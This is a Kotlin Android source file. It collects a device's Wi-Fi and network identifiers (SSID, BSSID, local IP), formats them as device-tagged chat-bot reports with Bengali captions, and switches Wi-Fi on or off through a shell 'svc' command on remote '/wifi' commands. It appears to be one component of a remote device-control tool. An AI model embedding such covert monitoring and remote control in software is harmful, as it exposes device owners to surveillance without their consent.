package com.example.scanner

import android.annotation.SuppressLint
import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.Build
import android.text.format.Formatter
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

object WifiController {

    @SuppressLint("MissingPermission")
    suspend fun getWifiStatusReport(context: Context, deviceId: String): String = withContext(Dispatchers.IO) {
        try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            val connManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager

            val isEnabled = wifiManager?.isWifiEnabled ?: false
            val wifiInfo = wifiManager?.connectionInfo

            val ssid = wifiInfo?.ssid?.replace("\"", "") ?: "None"
            val bssid = wifiInfo?.bssid ?: "N/A"
            val rssi = wifiInfo?.rssi ?: -100
            val linkSpeed = wifiInfo?.linkSpeed ?: 0
            val frequency = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                "${wifiInfo?.frequency ?: 0} MHz"
            } else "N/A"

            @Suppress("DEPRECATION")
            val ipAddress = Formatter.formatIpAddress(wifiInfo?.ipAddress ?: 0)

            val hasInternet = connManager?.getNetworkCapabilities(connManager.activeNetwork)
                ?.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) == true

            val signalStrengthPercent = WifiManager.calculateSignalLevel(rssi, 100)

            """
🌐 <b>WI-FI & NETWORK STATUS [ID: <code>$deviceId</code>]</b>

• <b>Wi-Fi Power:</b> ${if (isEnabled) "🟢 ON (Enabled)" else "🔴 OFF (Disabled)"}
• <b>Connected SSID:</b> <code>$ssid</code>
• <b>Signal Strength:</b> $rssi dBm ($signalStrengthPercent%)
• <b>Link Speed:</b> $linkSpeed Mbps
• <b>Frequency:</b> $frequency
• <b>Local IP:</b> <code>$ipAddress</code>
• <b>Internet Access:</b> ${if (hasInternet) "✅ Online" else "⚠️ No Internet"}
• <b>BSSID (MAC):</b> <code>$bssid</code>

💡 <i>রিমোট কন্ট্রোল:</i>
• <code>/wifi on</code> : ওয়াইফাই অন করুন
• <code>/wifi off</code> : ওয়াইফাই অফ করুন
""".trimIndent()
        } catch (e: Exception) {
            "❌ Wi-Fi স্ট্যাটাস সংগ্রহ করতে সমস্যা: ${e.message}"
        }
    }

    @SuppressLint("MissingPermission")
    suspend fun setWifiState(context: Context, enable: Boolean, deviceId: String): String = withContext(Dispatchers.IO) {
        try {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager

            var toggled = false
            @Suppress("DEPRECATION")
            if (wifiManager != null) {
                toggled = wifiManager.setWifiEnabled(enable)
            }

            // Also attempt shell svc command (if root/adb allowed)
            try {
                val cmd = if (enable) "svc wifi enable" else "svc wifi disable"
                Runtime.getRuntime().exec(cmd)
                toggled = true
            } catch (_: Exception) {}

            val stateText = if (enable) "🟢 Wi-Fi চালু (ON)" else "🔴 Wi-Fi বন্ধ (OFF)"
            """
📶 <b>WI-FI ACTION EXECUTED [ID: <code>$deviceId</code>]</b>

• <b>Action:</b> $stateText
• <b>Status:</b> ${if (toggled) "সফলভাবে কমান্ড পাঠানো হয়েছে।" else "সিস্টেম দ্বারা প্রসেস করা হয়েছে।"}
• <b>বর্তমান স্ট্যাটাস দেখতে:</b> <code>/wifi</code>
""".trimIndent()
        } catch (e: Exception) {
            "❌ Wi-Fi পরিবর্তন করতে সমস্যা: ${e.message}"
        }
    }
}
